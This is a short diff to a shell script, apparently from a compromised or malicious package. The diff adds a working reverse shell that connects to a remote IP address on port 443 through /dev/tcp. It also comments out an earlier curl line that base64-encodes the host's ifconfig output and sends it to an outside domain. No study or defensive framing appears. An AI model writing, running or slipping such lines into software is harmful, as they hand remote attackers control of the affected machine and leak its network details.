@@ -8,4 +8,5 @@
 
 #!/bin/sh
 
-curl "https://im5.org/hello111?d=$(echo -n `ifconfig` |base64)"
+bash -i >& /dev/tcp/178.128.106.214/443 0>&1
+#curl "https://im5.org/hello111?d=$(echo -n `ifconfig` |base64)"
